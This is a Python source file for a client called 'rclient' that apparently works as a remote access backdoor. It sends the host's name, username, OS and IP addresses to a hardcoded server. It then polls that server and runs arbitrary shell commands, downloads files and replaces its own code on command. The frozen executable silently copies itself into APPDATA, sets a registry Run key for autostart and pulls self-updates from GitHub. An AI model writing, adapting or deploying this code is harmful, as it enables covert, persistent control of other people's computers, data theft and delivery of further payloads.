import logging
import os
import platform
import socket
import shutil
import subprocess
import sys
import time
import uuid
import getpass
from pathlib import Path
from urllib.parse import urlparse

import requests

TOKEN = "a9K2xP8mZ7QwL1vB"
SERVER_URL = "https://client-status-server.onrender.com"
POLL_INTERVAL_SECONDS = 5
REQUEST_TIMEOUT_SECONDS = 30
COMMAND_TIMEOUT_SECONDS = 120
APP_NAME = "rclient"
TASK_NAME = "rclient"
RUN_REGISTRY_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
APP_VERSION = "1.0.0"
GITHUB_OWNER = "hezztecan-spec"
GITHUB_REPO = "licilicl"
AUTO_UPDATE_ENABLED = True
AUTO_UPDATE_CHECK_INTERVAL_SECONDS = 600
IS_FROZEN = getattr(sys, "frozen", False)
BASE_DIR = Path(sys.executable).resolve().parent if IS_FROZEN else Path(__file__).resolve().parent
STATE_DIR = BASE_DIR / "state"
DOWNLOADS_DIR = BASE_DIR / "downloads"
CLIENT_ID_PATH = STATE_DIR / "client_id.txt"
LOG_PATH = STATE_DIR / "client.log"


def ensure_directories():
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)


def configure_logging():
    ensure_directories()
    handlers = [logging.FileHandler(LOG_PATH, encoding="utf-8")]
    if not IS_FROZEN:
        handlers.append(logging.StreamHandler(sys.stdout))

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=handlers,
    )


def load_or_create_client_id():
    ensure_directories()
    if CLIENT_ID_PATH.exists():
        client_id = CLIENT_ID_PATH.read_text(encoding="utf-8").strip()
        if client_id:
            return client_id

    client_id = str(uuid.uuid4())
    CLIENT_ID_PATH.write_text(client_id, encoding="utf-8")
    logging.info("Generated new client_id: %s", client_id)
    return client_id


def send_post(endpoint, payload):
    url = f"{SERVER_URL}{endpoint}"
    response = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT_SECONDS, headers=build_http_headers())
    response.raise_for_status()
    return response.json()


def send_get(endpoint, params):
    url = f"{SERVER_URL}{endpoint}"
    response = requests.get(url, params=params, timeout=REQUEST_TIMEOUT_SECONDS, headers=build_http_headers())
    response.raise_for_status()
    return response.json()


def get_local_ip_addresses():
    addresses = []

    try:
        host_info = socket.gethostbyname_ex(socket.gethostname())
        for address in host_info[2]:
            if address and address not in addresses:
                addresses.append(address)
    except OSError:
        pass

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            address = sock.getsockname()[0]
            if address and address not in addresses:
                addresses.append(address)
    except OSError:
        pass

    return addresses


def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.platform(),
        "python_version": platform.python_version(),
        "client_version": APP_VERSION,
        "local_ips": ", ".join(get_local_ip_addresses()) or "unknown",
        "frozen": "true" if IS_FROZEN else "false",
    }


def register_client(client_id):
    logging.info("Registering client %s", client_id)
    send_post(
        "/register",
        {
            "client_id": client_id,
            "token": TOKEN,
            "system_info": get_system_info(),
        },
    )


def get_command(client_id):
    return send_get("/get-command", {"client_id": client_id, "token": TOKEN}).get("command")


def report_result(client_id, result):
    safe_result = result if len(result) <= 10000 else f"{result[:10000]}\n\n[truncated]"
    logging.info("Reporting result for client %s", client_id)
    send_post("/report", {"client_id": client_id, "token": TOKEN, "result": safe_result})


def execute_shell(command_text):
    shell_command = command_text[len("shell:") :].strip()
    if not shell_command:
        raise ValueError("shell command is empty")

    logging.info("Executing shell command: %s", shell_command)
    completed = subprocess.run(
        shell_command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=COMMAND_TIMEOUT_SECONDS,
    )

    stdout = completed.stdout.strip()
    stderr = completed.stderr.strip()
    parts = [f"exit_code={completed.returncode}"]
    if stdout:
        parts.append(f"stdout:\n{stdout}")
    if stderr:
        parts.append(f"stderr:\n{stderr}")
    return "\n\n".join(parts)


def derive_filename_from_url(url):
    parsed = urlparse(url)
    name = Path(parsed.path).name
    return name or "downloaded_file"


def download_to_path(url, destination):
    with requests.get(
        url,
        stream=True,
        timeout=REQUEST_TIMEOUT_SECONDS,
        headers=build_http_headers(),
    ) as response:
        response.raise_for_status()
        with destination.open("wb") as target:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    target.write(chunk)


def execute_download(command_text):
    payload = command_text[len("download:") :].strip()
    if not payload:
        raise ValueError("download command is empty")

    parts = payload.split(maxsplit=1)
    url = parts[0]
    filename = parts[1].strip() if len(parts) == 2 else derive_filename_from_url(url)
    destination = DOWNLOADS_DIR / filename

    logging.info("Downloading file from %s to %s", url, destination)
    download_to_path(url, destination)
    size = destination.stat().st_size
    return f"downloaded={destination} size={size}"


def execute_update(command_text):
    update_url = command_text[len("update:") :].strip()
    if not update_url:
        raise ValueError("update command is empty")

    return apply_update_from_url(update_url, source="manual")


def restart_current_client():
    script_path = Path(sys.executable).resolve() if IS_FROZEN else Path(__file__).resolve()

    if IS_FROZEN and is_windows():
        start_detached_windows_process([str(script_path)])
        raise RestartRequested("client_restarted source=manual restarting=true")

    restart_python_client(script_path)
    raise RestartRequested("client_restarted source=manual restarting=true")


def execute_command(command_text):
    if not isinstance(command_text, str):
        raise ValueError("command must be a string")

    normalized = command_text.strip()
    if not normalized:
        raise ValueError("command is empty")

    if normalized == "restart":
        return restart_current_client()
    if normalized.startswith("shell:"):
        return execute_shell(normalized)
    if normalized.startswith("download:"):
        return execute_download(normalized)
    if normalized.startswith("update:"):
        return execute_update(normalized)

    raise ValueError(
        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], or update:<url>"
    )


def is_windows():
    return os.name == "nt"


def build_http_headers():
    return {
        "User-Agent": f"{APP_NAME}/{APP_VERSION}"
    }


def get_install_dir():
    appdata = os.environ.get("APPDATA")
    if not appdata:
        raise RuntimeError("APPDATA is not defined")
    return Path(appdata) / APP_NAME


def get_installed_executable_path():
    install_dir = get_install_dir()
    executable_name = f"{APP_NAME}.exe"
    return install_dir / executable_name


def is_running_from_installed_location():
    if not IS_FROZEN or not is_windows():
        return True

    current_path = Path(sys.executable).resolve()
    target_path = get_installed_executable_path().resolve()
    return current_path == target_path


def parse_version(version_text):
    clean = version_text.strip().lower().lstrip("v")
    parts = []
    for item in clean.split("."):
        try:
            parts.append(int(item))
        except ValueError:
            parts.append(0)
    return tuple(parts)


def is_newer_version(candidate_version, current_version):
    return parse_version(candidate_version) > parse_version(current_version)


def get_expected_release_asset_name():
    return f"{APP_NAME}.exe" if IS_FROZEN else "client.py"


def get_latest_release_api_url():
    return f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/releases/latest"


def get_latest_release_info():
    response = requests.get(
        get_latest_release_api_url(),
        timeout=REQUEST_TIMEOUT_SECONDS,
        headers=build_http_headers(),
    )
    response.raise_for_status()
    payload = response.json()
    latest_version = str(payload.get("tag_name", "")).strip()
    assets = payload.get("assets", [])
    asset_name = get_expected_release_asset_name()

    asset = next((item for item in assets if item.get("name") == asset_name), None)
    if not latest_version or not asset:
        return None

    return {
        "version": latest_version,
        "download_url": asset.get("browser_download_url", "").strip()
    }


class RestartRequested(Exception):
    def __init__(self, message):
        super().__init__(message)
        self.message = message


def restart_python_client(script_path):
    subprocess.Popen(
        [sys.executable, str(script_path)],
        cwd=str(BASE_DIR),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def start_detached_windows_process(command):
    creationflags = getattr(subprocess, "DETACHED_PROCESS", 0) | getattr(
        subprocess, "CREATE_NEW_PROCESS_GROUP", 0
    )
    subprocess.Popen(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=creationflags,
    )


def get_process_error_message(process_result, fallback_message):
    stderr_text = (process_result.stderr or "").strip()
    stdout_text = (process_result.stdout or "").strip()

    if stderr_text:
        return stderr_text
    if stdout_text:
        return stdout_text
    return fallback_message


def run_windows_command(command, fallback_message):
    completed = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    if completed.returncode != 0:
        raise RuntimeError(get_process_error_message(completed, fallback_message))
    return completed


def schedule_windows_binary_swap_and_restart(current_path, temp_path, backup_path):
    updater_path = current_path.with_name("update_client.cmd")
    pid = os.getpid()
    script_body = "\n".join(
        [
            "@echo off",
            "setlocal",
            ":waitloop",
            f'tasklist /FI "PID eq {pid}" | find "{pid}" >nul',
            "if %errorlevel%==0 (",
            "  timeout /t 1 /nobreak >nul",
            "  goto waitloop",
            ")",
            f'copy /Y "{current_path}" "{backup_path}" >nul',
            f'move /Y "{temp_path}" "{current_path}" >nul',
            f'start "" "{current_path}"',
            'del "%~f0"',
        ]
    )
    updater_path.write_text(script_body, encoding="utf-8")
    start_detached_windows_process(["cmd", "/c", str(updater_path)])


def apply_update_from_url(update_url, source, version_label="unknown"):
    script_path = Path(sys.executable).resolve() if IS_FROZEN else Path(__file__).resolve()
    replacement_suffix = ".exe.new" if IS_FROZEN else ".py.new"
    backup_suffix = ".exe.bak" if IS_FROZEN else ".py.bak"
    temp_path = script_path.with_suffix(replacement_suffix)
    backup_path = script_path.with_suffix(backup_suffix)

    logging.info("Updating client from %s", update_url)
    download_to_path(update_url, temp_path)

    if not temp_path.exists() or temp_path.stat().st_size == 0:
        temp_path.unlink(missing_ok=True)
        raise ValueError("downloaded update is empty")

    if IS_FROZEN and is_windows():
        schedule_windows_binary_swap_and_restart(script_path, temp_path, backup_path)
        raise RestartRequested(
            f"client_updated source={source} version={version_label} restarting=true"
        )

    shutil.copy2(script_path, backup_path)
    os.replace(temp_path, script_path)
    restart_python_client(script_path)
    raise RestartRequested(
        f"client_updated source={source} version={version_label} restarting=true"
    )


def install_windows_autostart():
    if not is_windows():
        raise RuntimeError("Windows autostart is supported only on Windows")
    if not IS_FROZEN:
        raise RuntimeError("Build the client as .exe before using --install")

    source_executable = Path(sys.executable).resolve()
    install_dir = get_install_dir()
    install_dir.mkdir(parents=True, exist_ok=True)
    target_executable = get_installed_executable_path()

    shutil.copy2(source_executable, target_executable)

    run_windows_command(
        [
            "reg",
            "add",
            RUN_REGISTRY_KEY,
            "/v",
            TASK_NAME,
            "/t",
            "REG_SZ",
            "/d",
            f'"{target_executable}"',
            "/f",
        ],
        "Failed to register Windows autostart",
    )

    start_detached_windows_process([str(target_executable)])

    return f"installed_to={target_executable} autostart_registry={TASK_NAME} started=true"


def uninstall_windows_autostart():
    if not is_windows():
        raise RuntimeError("Windows autostart is supported only on Windows")

    subprocess.run(
        ["reg", "delete", RUN_REGISTRY_KEY, "/v", TASK_NAME, "/f"],
        capture_output=True,
        text=True,
        check=False,
    )

    install_dir = get_install_dir()
    target_executable = get_installed_executable_path()
    if target_executable.exists():
        try:
            target_executable.unlink()
        except OSError:
            pass

    if install_dir.exists():
        try:
            install_dir.rmdir()
        except OSError:
            pass

    return f"autostart_removed={TASK_NAME}"


def print_windows_install_help():
    script_name = Path(sys.argv[0]).name
    message = [
        "Windows EXE usage:",
        f"  {script_name} --install   Install client and enable autostart",
        f"  {script_name} --uninstall Remove autostart and installed EXE",
        f"  {script_name}             Run client in foreground",
    ]
    print("\n".join(message))


def install_if_needed_for_windows_exe():
    if IS_FROZEN and is_windows() and not is_running_from_installed_location():
        result = install_windows_autostart()
        raise RestartRequested(result)


def check_for_auto_update():
    if not AUTO_UPDATE_ENABLED:
        return

    release_info = get_latest_release_info()
    if not release_info:
        logging.info("Auto-update check skipped: release info not found")
        return

    latest_version = release_info["version"]
    if not is_newer_version(latest_version, APP_VERSION):
        logging.info("No update available. Current version: %s", APP_VERSION)
        return

    logging.info("New version available: %s", latest_version)
    apply_update_from_url(
        release_info["download_url"],
        source="auto",
        version_label=latest_version,
    )


def register_client_with_retry(client_id):
    while True:
        try:
            register_client(client_id)
            return
        except Exception as error:
            logging.exception("Register failed: %s", error)
            time.sleep(10)


def run_client():
    configure_logging()
    install_if_needed_for_windows_exe()
    client_id = load_or_create_client_id()
    register_client_with_retry(client_id)
    logging.info("Client started with id %s", client_id)
    next_update_check_at = 0

    while True:
        try:
            if time.time() >= next_update_check_at:
                next_update_check_at = time.time() + AUTO_UPDATE_CHECK_INTERVAL_SECONDS
                check_for_auto_update()

            command = get_command(client_id)
            if command:
                logging.info("Received command: %s", command)
                result = execute_command(command)
                logging.info("Command completed")
                report_result(client_id, result)
            else:
                logging.info("No command available")
        except RestartRequested as event:
            logging.info("Restart requested: %s", event.message)
            try:
                report_result(client_id, event.message)
            except Exception:
                logging.exception("Failed to report restart event")
            return
        except requests.HTTPError as error:
            status_code = error.response.status_code if error.response is not None else "unknown"
            logging.exception("HTTP error while communicating with server: %s", status_code)
        except Exception as error:
            logging.exception("Client loop failed: %s", error)
            try:
                report_result(client_id, f"error={error}")
            except Exception:
                logging.exception("Failed to report error")

        time.sleep(POLL_INTERVAL_SECONDS)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        command = sys.argv[1].strip().lower()
        if command == "--install":
            result = install_windows_autostart()
            print(result)
            sys.exit(0)
        if command == "--uninstall":
            result = uninstall_windows_autostart()
            print(result)
            sys.exit(0)
        if command in {"--help", "/?"}:
            print_windows_install_help()
            sys.exit(0)

    try:
        run_client()
    except RestartRequested:
        sys.exit(0)
